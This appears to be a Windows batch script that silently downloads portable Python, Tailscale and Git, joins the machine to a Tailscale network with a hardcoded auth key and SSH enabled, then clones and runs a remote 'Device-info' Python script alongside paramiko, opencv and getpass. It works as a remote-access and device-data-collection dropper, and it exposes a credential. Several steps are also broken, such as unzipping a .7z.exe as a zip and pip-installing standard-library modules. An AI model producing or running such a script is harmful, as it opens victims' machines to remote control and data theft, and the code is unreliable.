@echo off
setlocal

:: Define directories for Python, Tailscale, and Git
set BASE_DIR=%~dp0
set PYTHON_DIR=%BASE_DIR%python310
set TAILSCALE_DIR=%BASE_DIR%tailscale
set GIT_DIR=%BASE_DIR%git

:: Step 1: Check if Python is available, download if not
if not exist "%PYTHON_DIR%\python.exe" (
    echo [*] Python not found. Downloading and extracting Python Portable...
    curl -o python-embed.zip https://www.python.org/ftp/python/3.10.6/python-3.10.6-embed-amd64.zip
    powershell -Command "Expand-Archive -Path 'python-embed.zip' -DestinationPath '%PYTHON_DIR%'"
    del /f /q python-embed.zip
    echo [*] Python extracted successfully.
) else (
    echo [*] Python already available.
)

:: Step 2: Check if Tailscale is available, download if not
if not exist "%TAILSCALE_DIR%\tailscale.exe" (
    echo [*] Tailscale not found. Downloading and extracting Tailscale Portable...
    curl -o tailscale-setup.exe https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe
    7z x tailscale-setup.exe -o%TAILSCALE_DIR%  
    del /f /q tailscale-setup.exe
    echo [*] Tailscale extracted successfully.
) else (
    echo [*] Tailscale already available.
)

:: Step 3: Check if Git is available, download if not
if not exist "%GIT_DIR%\bin\git.exe" (
    echo [*] Git not found. Downloading and extracting Git Portable...
    curl -o git-portable.zip https://github.com/git-for-windows/git/releases/download/v2.42.0.windows.1/PortableGit-2.42.0-64-bit.7z.exe
    powershell -Command "Expand-Archive -Path 'git-portable.zip' -DestinationPath '%GIT_DIR%'"
    del /f /q git-portable.zip
    echo [*] Git extracted successfully.
) else (
    echo [*] Git already available.
)

:: Step 4: Add temporary paths to allow using Python, Tailscale, and Git
set PATH=%PYTHON_DIR%;%TAILSCALE_DIR%;%GIT_DIR%\bin;%PATH%

:: Step 5: Start Tailscale and log in using the provided Auth Key
echo [*] Starting and logging into Tailscale using Auth Key...
%TAILSCALE_DIR%\tailscale.exe up --authkey tskey-auth-kUU5ZKrmid11CNTRL-tsTWq7PrzaSiaA5peBcfaSE2pTgSamjZU --ssh

:: Step 6: Clone the GitHub repository if it doesn't exist
set CLONE_DIR=%BASE_DIR%Device-info
if not exist "%CLONE_DIR%" (
    echo [*] Cloning the Device-info repository...
    %GIT_DIR%\bin\git.exe clone https://github.com/uchihasosuke/Device-info.git "%CLONE_DIR%"
) else (
    echo [*] Repository already cloned.
)

:: Step 7: Change directory to the cloned repository
cd "%CLONE_DIR%"

:: Step 8: Upgrade pip and install Python dependencies
echo [*] Installing required Python packages...
%PYTHON_DIR%\python.exe -m pip install --upgrade pip
%PYTHON_DIR%\python.exe -m pip install paramiko psutil opencv-python-headless socket uuid datetime re getpass

:: Step 9: Run the device4.py script
echo [*] Running the device4.py script...
%PYTHON_DIR%\python.exe device4.py

:: Step 10: Log out of Tailscale after successful completion
echo [*] Logging out of Tailscale...
%TAILSCALE_DIR%\tailscale.exe down

echo [*] Script execution completed successfully.

